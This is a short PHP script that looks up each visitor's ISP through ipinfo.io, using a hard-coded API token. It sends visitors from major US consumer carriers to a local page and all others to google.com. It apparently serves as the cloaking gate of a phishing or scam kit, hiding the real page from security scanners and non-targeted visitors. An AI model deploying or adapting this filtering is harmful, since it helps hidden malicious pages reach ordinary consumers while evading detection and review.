<?php 
 
// IP address 
$userIP = getenv('REMOTE_ADDR'); 
// API end URL 
$apiURL = 'https://ipinfo.io/'.$userIP.'?token=ee49ad1e2a686c'; 
 
// Create a new cURL resource with URL 
$ch = curl_init($apiURL); 
 
// Return response instead of outputting 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
 
// Execute API request 
$apiResponse = curl_exec($ch); 
 
// Close cURL resource 
curl_close($ch); 
 
// Retrieve IP data from API response 
$ipData = json_decode($apiResponse, true); 
 
if(!empty($ipData)){ 
    $isp = $ipData['org']; 

    echo '-'; 
}else{ 
    echo '-'; 
} 

if ($isp == "AS6167 Verizon Business") {
	header ("Location: i.html");
}elseif ($isp == "AS21928 T-Mobile USA, Inc.") {
	header ("Location: i.html");
}elseif ($isp == "AS7018 AT&T Services, Inc.") {
	header ("Location: i.html");
}elseif ($isp == "AS11427 Charter Communications Inc") {
	header ("Location: i.html");
}elseif ($isp == "AS7922 Comcast Cable Communications, LLC") {
	header ("Location: i.html");
}elseif ($isp == "AS797 AT&T Services, Inc.") {
	header ("Location: i.html");
}elseif ($isp == "AS7018 AT&T Services, Inc.") {
	header ("Location: i.html");
}elseif ($isp == "AS701 Verizon Business") {
	header ("Location: i.html");
}elseif ($isp == "AS7018 AT&T Services, Inc.") {
	header ("Location: i.html");
}elseif ($isp == "AS1239 Sprint") {
	header ("Location: i.html");
} else {
  header ("Location: https://www.google.com");
}
 
?>